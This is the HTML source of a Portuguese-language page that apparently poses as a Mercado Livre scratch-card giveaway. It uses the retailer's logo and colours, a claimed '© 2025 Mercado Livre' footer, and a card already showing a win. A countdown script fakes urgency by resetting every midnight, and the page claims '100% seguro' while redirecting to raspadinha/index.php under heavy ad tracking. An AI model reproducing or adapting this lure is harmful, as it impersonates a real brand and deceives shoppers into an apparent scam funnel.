<!DOCTYPE html>
<html lang="pt-BR">
  <head>
<meta charset="UTF-8">
<script async="" src="js/fbevents.js">

</script>
<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
<!-- Meta Pixel Code -->
<script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '1467544351059972');
fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=1467544351059972&ev=PageView&noscript=1"
/>
</noscript>
<!-- End Meta Pixel Code -->
<script>
  window.pixelId = "68b7ab8c36b36a155cbfaf69";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
  document.head.appendChild(a);
</script><script async="" defer="" src="js/pixel.js"></script>
<script src="js/latest_1.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
<!-- Google tag (gtag.js) -->
<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-19KNHMTN2F"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-19KNHMTN2F');
</script>
<script async="" defer="" src="js/pixel_1.js"></script>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Raspadinha Mercado Livre - Ganhe Produtos Grátis!</title>

  <!-- (Obs: Proxima Nova não existe no Google Fonts; manterei seu link para evitar quebra) -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
  <link href="https://fonts.googleapis.com/css2?family=Proxima+Nova:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">

  <style>
  :root {
    --ml-yellow: #FFE600;
    --ml-yellow-dark: #E6CF00;
    --ml-blue: #3483FA;
    --ml-blue-dark: #2968C8;
    --ml-blue-light: #E6F2FF;
    --ml-gray-100: #F5F5F5;
    --ml-gray-200: #EEEEEE;
    --ml-gray-300: #CCCCCC;
    --ml-gray-400: #999999;
    --ml-gray-500: #666666;
    --ml-gray-600: #333333;
    --ml-gray-700: #1A1A1A;
    --ml-success: #00A650;
    --ml-warning: #FF6900;
    --ml-danger: #D0021B;
    --white: #FFFFFF;
    --shadow-sm: 0 1px 3px rgba(0,0,0,0.1);
    --shadow-md: 0 4px 6px rgba(0,0,0,0.1);
    --shadow-lg: 0 10px 25px rgba(0,0,0,0.1);
    --shadow-xl: 0 20px 40px rgba(0,0,0,0.15);
    --radius-sm: 4px;
    --radius-md: 8px;
    --radius-lg: 12px;
    --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
  }

  * { margin: 0; padding: 0; box-sizing: border-box; }

  body {
    font-family: 'Proxima Nova', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    background: var(--ml-gray-100);
    line-height: 1.6;
    color: var(--ml-gray-600);
    overflow-x: hidden;
  }

  .container {
    max-width: 1200px;
    margin: 0 auto;
    background: var(--white);
    min-height: 100vh;
    box-shadow: var(--shadow-md);
    position: relative;
  }

  /* Header */
  .header {
    background: var(--ml-yellow);
    padding: 16px 24px;
    position: sticky;
    top: 0;
    z-index: 100;
    box-shadow: var(--shadow-sm);
  }
  .header-content {
    display: flex;
    align-items: center;
    justify-content: center;
    max-width: 1200px;
    margin: 0 auto;
  }
  .logo { height: 40px; width: auto; }

  /* Urgency Banner */
  .urgency-banner {
    background: linear-gradient(135deg, var(--ml-warning), var(--ml-danger));
    color: var(--white);
    padding: 12px 24px;
    text-align: center;
    font-size: 14px;
    font-weight: 600;
    position: relative;
    overflow: hidden;
  }
  .urgency-banner::before {
    content: '';
    position: absolute; top: 0; left: -100%;
    width: 100%; height: 100%;
    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
    animation: shimmer 3s infinite;
  }
  @keyframes shimmer { 0% { left: -100%; } 100% { left: 100%; } }

  /* Hero Section */
  .hero-section {
    padding: 48px 24px;
    text-align: center;
    background: linear-gradient(135deg, var(--white) 0%, var(--ml-blue-light) 100%);
    position: relative;
    overflow: hidden;
  }
  .hero-section::before {
    content: '';
    position: absolute; top: -50%; right: -50%;
    width: 200%; height: 200%;
    background: radial-gradient(circle, rgba(255,230,0,0.1) 0%, transparent 70%);
    animation: rotate 20s linear infinite;
  }
  @keyframes rotate { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

  .hero-content {
    position: relative; z-index: 2;
    max-width: 800px; margin: 0 auto;
  }
  .hero-badge {
    display: inline-flex; align-items: center; gap: 8px;
    background: var(--ml-yellow); color: var(--ml-gray-700);
    padding: 8px 16px; border-radius: 20px;
    font-size: 12px; font-weight: 700; margin-bottom: 24px;
    text-transform: uppercase; letter-spacing: 0.5px;
    box-shadow: var(--shadow-sm);
  }
  .hero-title {
    font-size: clamp(28px, 5vw, 42px);
    font-weight: 700; color: var(--ml-gray-700);
    margin-bottom: 16px; line-height: 1.2;
  }
  .hero-subtitle {
    font-size: clamp(16px, 3vw, 18px);
    color: var(--ml-gray-500); margin-bottom: 40px; line-height: 1.5;
    max-width: 600px; margin-left: auto; margin-right: auto;
  }

  /* Icons */
  .icon { display: inline-block; width: 20px; height: 20px; fill: currentColor; }
  .icon-lg { width: 32px; height: 32px; }
  .icon-xl { width: 48px; height: 48px; }

  /* ===== Raspadinha Pro ===== */
  .scratch-pro { display: grid; place-items: center; padding: 8px; }
  .scratch-pro__card {
    position: relative; width: min(380px, 92vw); aspect-ratio: 16/9;
    border-radius: 16px; overflow: hidden;
    background: linear-gradient(135deg, #3483FA 0%, #2968C8 100%);
    border: 3px solid #FFE600;
    box-shadow: 0 12px 30px rgba(0,0,0,.16), 0 1px 0 rgba(255,230,0,.45) inset;
    transition: transform .25s ease, box-shadow .25s ease;
  }
  .scratch-pro__card:hover {
    transform: translateY(-2px);
    box-shadow: 0 18px 40px rgba(0,0,0,.22), 0 1px 0 rgba(255,230,0,.45) inset;
  }
  .scratch-pro__content {
    position: absolute; inset: 0; display: grid; place-items: center;
    padding: 16px; text-align: center; color: #fff; font-weight: 800;
    font-size: clamp(16px, 3.2vw, 20px); letter-spacing: .3px; z-index: 1;
    text-shadow: 0 2px 8px rgba(0,0,0,.25);
  }
  .scratch-pro__foil {
    position: absolute; inset: 0; z-index: 2; border-radius: 14px;
    background:
      linear-gradient(120deg, rgba(255,255,255,.0) 35%, rgba(255,255,255,.25) 50%, rgba(255,255,255,0) 65%) 0/300% 100%,
      repeating-linear-gradient(135deg, #e9e9e9 0 10px, #d9d9d9 10px 20px),
      radial-gradient(120% 100% at 50% 0%, rgba(0,0,0,.08), rgba(0,0,0,0) 50%);
    animation: scratchShimmer 3.5s linear infinite;
    box-shadow: inset 0 0 0 1px rgba(0,0,0,.05), inset 0 -10px 25px rgba(0,0,0,.08);
    display: grid; place-items: center;
  }
  .scratch-pro__pill {
    display: inline-block; background: #FFE600; color: #1A1A1A;
    padding: 10px 18px; border-radius: 999px; font-weight: 800; font-size: 14px; letter-spacing: .4px;
    box-shadow: 0 6px 14px rgba(255,230,0,.35); text-transform: uppercase;
  }
  @keyframes scratchShimmer { 0%{background-position:0% 0,0 0,0 0}100%{background-position:300% 0,0 0,0 0} }
  @media (prefers-reduced-motion: reduce) {
    .scratch-pro__card { transition: none; }
    .scratch-pro__foil { animation: none; }
  }

  /* CTA Button */
  .cta-button{
    background: var(--ml-blue); color: var(--white); border: none;
    padding: 16px 48px; border-radius: var(--radius-md);
    font-size: clamp(16px, 3vw, 18px); font-weight: 600; cursor: pointer;
    transition: var(--transition); box-shadow: var(--shadow-md);
    position: relative; overflow: hidden; margin-bottom: 40px;
    text-transform: uppercase; letter-spacing: 0.5px; font-family: inherit;
    display: inline-flex; align-items: center; gap: 8px;
  }
  .cta-button::before{
    content:''; position:absolute; top:0; left:-100%;
    width:100%; height:100%;
    background:linear-gradient(90deg,transparent,rgba(255,255,255,0.2),transparent);
    transition:left .6s;
  }
  .cta-button:hover{ transform:translateY(-2px); box-shadow:var(--shadow-lg); background:var(--ml-blue-dark); }
  .cta-button:hover::before{ left:100%; }
  .cta-button:active{ transform:translateY(0); }

  /* Benefits Grid */
  .benefits{
    display:grid; grid-template-columns:repeat(auto-fit,minmax(250px,1fr));
    gap:20px; margin-bottom:40px; max-width:800px; margin-left:auto; margin-right:auto;
  }
  .benefit-item{
    background:var(--white); padding:24px 20px; border-radius:var(--radius-md);
    text-align:center; box-shadow:var(--shadow-sm); transition:var(--transition);
    border:1px solid var(--ml-gray-200); position:relative; overflow:hidden;
  }
  .benefit-item::before{
    content:''; position:absolute; top:0; left:0; width:100%; height:3px; background:var(--ml-yellow);
    transform:scaleX(0); transition:var(--transition);
  }
  .benefit-item:hover{ transform:translateY(-4px); box-shadow:var(--shadow-md); border-color:var(--ml-yellow); }
  .benefit-item:hover::before{ transform:scaleX(1); }
  .benefit-icon{ margin-bottom:16px; display:flex; justify-content:center; color:var(--ml-blue); transition:var(--transition); }
  .benefit-item:hover .benefit-icon{ color:var(--ml-yellow-dark); transform:scale(1.1); }
  .benefit-title{ font-size:16px; font-weight:600; color:var(--ml-gray-700); margin-bottom:8px; }
  .benefit-desc{ font-size:14px; color:var(--ml-gray-500); line-height:1.4; }

  /* Disclaimer */
  .disclaimer{
    background:var(--ml-blue-light); padding:20px 24px; border-radius:var(--radius-md);
    font-size:14px; color:var(--ml-gray-500); text-align:center; margin-bottom:32px;
    border-left:4px solid var(--ml-yellow); line-height:1.5;
  }

  .highlight{ border-left:4px solid var(--ml-yellow); line-height:1.5; }

  /* Footer */
  .footer{ background:var(--ml-gray-100); color:var(--ml-gray-600); padding:32px 24px; text-align:center; }
  .footer-content{ max-width:800px; margin:0 auto; }
  .footer-logo{ height:40px; margin-bottom:16px; width:auto; }
  .footer-text{ font-size:14px; opacity:.9; line-height:1.6; }

  /* Floating Elements */
  .floating-elements{ position:fixed; width:100%; height:100%; pointer-events:none; z-index:1; top:0; left:0; }
  .floating-icon{ position:absolute; opacity:.1; animation:float 12s ease-in-out infinite; color:var(--ml-blue); }
  .floating-icon:nth-child(1){ top:20%; left:10%; animation-delay:0s; animation-duration:15s; }
  .floating-icon:nth-child(2){ top:40%; right:15%; animation-delay:5s; animation-duration:18s; }
  .floating-icon:nth-child(3){ top:70%; left:20%; animation-delay:10s; animation-duration:12s; }
  @keyframes float{ 0%,100%{ transform:translateY(0) rotate(0); opacity:.1 } 50%{ transform:translateY(-30px) rotate(180deg); opacity:.05 } }

  /* Sparkles */
  .sparkle{ position:absolute; width:4px; height:4px; background:var(--ml-yellow); border-radius:50%; animation:sparkle 2s ease-in-out infinite; }
  @keyframes sparkle{ 0%,100%{ transform:scale(0) rotate(0); opacity:0 } 50%{ transform:scale(1) rotate(180deg); opacity:1 } }

  /* Animations */
  .fade-in-up{ animation:fadeInUp .8s ease-out; }
  @keyframes fadeInUp{ from{opacity:0; transform:translateY(20px)} to{opacity:1; transform:translateY(0)} }

  /* Responsive */
  @media (max-width:768px){
    .container{ box-shadow:none; }
    .header{ padding:12px 20px; }
    .hero-section{ padding:32px 20px; }
    .benefits{ grid-template-columns:1fr; gap:16px; margin-bottom:32px; }
    .benefit-item{ padding:20px 16px; }
    .cta-button{ padding:14px 32px; width:100%; max-width:280px; }
    .disclaimer{ padding:16px 20px; margin-bottom:24px; }
    .footer{ padding:24px 20px; }
  }
  @media (max-width:480px){
    .urgency-banner{ font-size:12px; padding:10px 16px; }
    .hero-section{ padding:24px 16px; }
    .benefits{ gap:12px; }
    .benefit-item{ padding:16px 12px; }
  }

  .benefit-item, .cta-button{ will-change: transform; }

  @media (prefers-reduced-motion: reduce){
    *,*::before,*::after{ animation-duration:.01ms !important; animation-iteration-count:1 !important; transition-duration:.01ms !important; }
  }
  .cta-button:focus, .scratch-pro__card:focus{ outline:2px solid var(--ml-blue); outline-offset:2px; }

  @media (prefers-contrast: high){
    .benefit-item{ border-width:2px; }
  }
  </style>
<link rel="preload" href="raspadinha/index.php" as="document"><link rel="preload" href="raspadinha/index.php" as="document"></head>

<body>
  <div class="floating-elements">
    <div class="floating-icon">
      <svg class="icon-xl" viewBox="0 0 24 24" fill="currentColor">
        <path d="M19 7h-3V6a4 4 0 0 0-8 0v1H5a1 1 0 0 0-1 1v11a3 3 0 0 0 3 3h10a3 3 0 0 0 3-3V8a1 1 0 0 0-1-1zM10 6a2 2 0 0 1 4 0v1h-4V6zm8 13a1 1 0 0 1-1 1H7a1 1 0 0 1-1-1V9h2v1a1 1 0 0 0 2 0V9h4v1a1 1 0 0 0 2 0V9h2v10z"></path>
      </svg>
    </div>
    <div class="floating-icon">
      <svg class="icon-xl" viewBox="0 0 24 24" fill="currentColor">
        <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path>
      </svg>
    </div>
    <div class="floating-icon">
      <svg class="icon-xl" viewBox="0 0 24 24" fill="currentColor">
        <path d="M20 6h-2.18l.61-2.05c.18-.6-.35-1.12-.86-.89L12 6 6.43 3.06c-.51-.23-1.04.29-.86.89L6.18 6H4c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2zM6.84 6.5L12 4.33 17.16 6.5H6.84zM4 18V8h16v10H4z"></path>
      </svg>
    </div>
  </div>

  <div class="container">
    <!-- Header -->
    <header class="header">
      <div class="header-content">
        <img src="images/mercado-livre-logo-1-2.png" alt="Mercado Livre" class="logo">
      </div>
    </header>

    <!-- Banner de Urgência -->
    <div class="urgency-banner" id="urgencyBanner"><svg class="icon" viewBox="0 0 24 24" fill="currentColor" style="margin-right:8px"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"></path></svg>ÚLTIMAS 3h 22min - Raspadinha com prêmios incríveis!</div>

    <!-- Hero -->
    <section class="hero-section fade-in-up">
      <div class="hero-content">
        <div class="hero-badge">
          <svg class="icon" viewBox="0 0 24 24" fill="currentColor">
            <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path>
          </svg>
          Promoção Especial
        </div>

        <h1 class="hero-title">Raspe e Ganhe<br>produtos incríveis!</h1>
        <p class="hero-subtitle">Participe da nossa raspadinha exclusiva e concorra a produtos originais do Mercado Livre. É grátis e sua sorte está aqui!</p>

        <!-- Raspadinha Pro -->
        <div class="scratch-pro">
          <div class="scratch-pro__card" onclick="startGame()" tabindex="0" role="button" aria-label="Clique para iniciar a raspadinha">
            <div class="scratch-pro__content">🎉 Parabéns! Você ganhou FRETE GRÁTIS</div>
            <div class="scratch-pro__foil"><span class="scratch-pro__pill">RASPE AQUI</span></div>
          </div>
        </div>

        <button class="cta-button" onclick="startGame()" aria-label="Participar da raspadinha">
          <svg class="icon" viewBox="0 0 24 24" fill="currentColor"><path d="M8 5v14l11-7z"></path></svg>
          Participar Agora
        </button>

        <!-- Benefícios -->
        <div class="benefits">
          <div class="benefit-item fade-in-up" style="animation-delay: 0s;">
            <div class="benefit-icon">
              <svg class="icon-lg" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path></svg>
            </div>
            <h3 class="benefit-title">Produtos Originais</h3>
            <p class="benefit-desc">Itens autênticos e com garantia oficial</p>
          </div>
          <div class="benefit-item fade-in-up" style="animation-delay: 0.1s;">
            <div class="benefit-icon">
              <svg class="icon-lg" viewBox="0 0 24 24" fill="currentColor"><path d="M13 3c-4.97 0-9 4.03-9 9H1l3.89 3.89.07.14L9 12H6c0-3.87 3.13-7 7-7s7 3.13 7 7-3.13 7-7 7c-1.93 0-3.68-.79-4.94-2.06l-1.42 1.42C8.27 19.99 10.51 21 13 21c4.97 0 9-4.03 9-9s-4.03-9-9-9zm-1 5v5l4.28 2.54.72-1.21-3.5-2.08V8H12z"></path></svg>
            </div>
            <h3 class="benefit-title">Resultado Instantâneo</h3>
            <p class="benefit-desc">Descubra na hora se você ganhou</p>
          </div>
          <div class="benefit-item fade-in-up" style="animation-delay: 0.2s;">
            <div class="benefit-icon">
              <svg class="icon-lg" viewBox="0 0 24 24" fill="currentColor"><path d="M20 8h-3V4H3c-1.1 0-2 .9-2 2v11h2c0 1.66 1.34 3 3 3s3-1.34 3-3h6c0 1.66 1.34 3 3 3s3-1.34 3-3h2v-5l-3-4zM6 18.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5zm13.5-9l1.96 2.5H17V9.5h2.5zM18 18.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"></path></svg>
            </div>
            <h3 class="benefit-title">Mercado Envios</h3>
            <p class="benefit-desc">Entrega rápida e segura</p>
          </div>
          <div class="benefit-item" style="animation-delay: 0.3s;">
            <div class="benefit-icon">
              <svg class="icon-lg" viewBox="0 0 24 24" fill="currentColor"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"></path></svg>
            </div>
            <h3 class="benefit-title">Compra Protegida</h3>
            <p class="benefit-desc">100% seguro e confiável</p>
          </div>
        </div>

        <!-- Disclaimer -->
        <div class="disclaimer">
          <svg class="icon" viewBox="0 0 24 24" fill="currentColor" style="margin-right:8px; vertical-align:middle;">
            <path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"></path>
          </svg>
          <strong>Promoção por tempo limitado.</strong> Participe agora e não perca sua chance de ganhar produtos incríveis do Mercado Livre!
        </div>
      </div>
    </section>

    <!-- Footer -->
    <footer class="footer">
      <div class="footer-content">
        <img src="images/mercado-livre-logo-1-2.png" alt="Mercado Livre" class="footer-logo">
        <p class="footer-text">
          © 2025 Mercado Livre - Todos os direitos reservados<br>
          Líder em e-commerce na América Latina há mais de 20 anos
        </p>
      </div>
    </footer>
  </div>

  <script>
    const prefersReducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;

    // Sparkles dinâmicos
    function addRandomSparkles(){
      if(prefersReducedMotion) return;
      const hero = document.querySelector('.hero-section');
      if(!hero) return;
      const sparkle = document.createElement('div');
      sparkle.className = 'sparkle';
      sparkle.style.left = Math.random()*100 + '%';
      sparkle.style.top  = Math.random()*100 + '%';
      sparkle.style.animationDelay = Math.random()*2 + 's';
      sparkle.setAttribute('aria-hidden', 'true');
      hero.appendChild(sparkle);
      setTimeout(()=> sparkle.remove(), 2000);
    }
    let sparkleTimeout;
    function throttledSparkles(){
      if(!sparkleTimeout){
        sparkleTimeout = setTimeout(()=>{ addRandomSparkles(); sparkleTimeout=null; }, 4000);
      }
    }
    if(!prefersReducedMotion){ throttledSparkles(); setInterval(throttledSparkles, 6000); }

    // Timer de urgência
    function updateUrgencyTimer(){
      const banner = document.getElementById('urgencyBanner');
      if(!banner) return;
      const now = new Date();
      const endOfDay = new Date(now.getFullYear(), now.getMonth(), now.getDate()+1, 0, 0, 0);
      const timeLeft = endOfDay - now;
      const hours = Math.floor(timeLeft / (1000*60*60));
      const minutes = Math.floor((timeLeft % (1000*60*60)) / (1000*60));
      const iconSvg = `<svg class="icon" viewBox="0 0 24 24" fill="currentColor" style="margin-right:8px"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>`;
      banner.innerHTML = `${iconSvg}ÚLTIMAS ${hours}h ${minutes}min - Raspadinha com prêmios incríveis!`;
    }
    updateUrgencyTimer();
    const timerInterval = setInterval(updateUrgencyTimer, 60000);

    // Redirecionamento corrigido (usa a nova classe da raspadinha)
    function startGame(){
      const card = document.querySelector('.scratch-pro__card');
      if(!card) return;
      card.style.transform = 'scale(0.96)';
      if(navigator.vibrate) navigator.vibrate(80);
      setTimeout(()=>{
        card.style.transform = '';
        // Ajuste o destino aqui, se necessário
        window.location.href = 'raspadinha/index.php';
      }, 150);
    }

    // Parallax
    let ticking = false;
    function updateParallax(){
      const scrolled = window.pageYOffset;
      const parallax = document.querySelector('.floating-elements');
      if(parallax){ parallax.style.transform = `translateY(${scrolled*0.2}px)`; }
      ticking = false;
    }
    function requestParallaxUpdate(){
      if(!ticking && !prefersReducedMotion){
        requestAnimationFrame(updateParallax);
        ticking = true;
      }
    }
    window.addEventListener('scroll', requestParallaxUpdate, { passive:true });

    // Animações de entrada
    function initAnimations(){
      const observer = new IntersectionObserver((entries)=>{
        entries.forEach((entry)=>{
          if(entry.isIntersecting){
            entry.target.classList.add('fade-in-up');
            observer.unobserve(entry.target);
          }
        });
      }, { threshold:0.1, rootMargin:'50px' });

      document.querySelectorAll('.benefit-item').forEach((item, i)=>{
        if(!prefersReducedMotion){ item.style.animationDelay = `${i*0.1}s`; }
        observer.observe(item);
      });
    }

    // Acessibilidade: teclado
    function handleKeyboardNavigation(e){
      if(e.target.classList.contains('scratch-pro__card') && (e.key === 'Enter' || e.key === ' ')){
        e.preventDefault(); startGame();
      }
    }
    document.addEventListener('keydown', handleKeyboardNavigation);

    // Init
    if(document.readyState === 'loading'){ document.addEventListener('DOMContentLoaded', initAnimations); }
    else { initAnimations(); }

    // Cleanup
    function cleanup(){
      clearInterval(timerInterval);
      window.removeEventListener('scroll', requestParallaxUpdate);
      document.removeEventListener('keydown', handleKeyboardNavigation);
    }
    window.addEventListener('beforeunload', cleanup);

    // SW opcional
    if('serviceWorker' in navigator){
      window.addEventListener('load', ()=>{
        navigator.serviceWorker.register('/sw.js').catch(()=>{});
      });
    }

    // Preload próxima página
    const link = document.createElement('link');
    link.rel = 'preload'; link.href = 'raspadinha/index.php'; link.as = 'document';
    document.head.appendChild(link);

    // Logs de erro (opcional)
    window.addEventListener('error', (ev)=>{ console.error('Erro capturado:', ev.error); });

    // Métricas simples
    if('performance' in window){
      window.addEventListener('load', ()=>{
        setTimeout(()=>{
          const nav = performance.getEntriesByType('navigation')[0];
          if(nav && nav.loadEventEnd > 0){
            const ms = nav.loadEventEnd - nav.fetchStart;
            console.log(`Página carregada em ${ms}ms`);
          }
        },100);
      });
    }
  </script>


</body></html>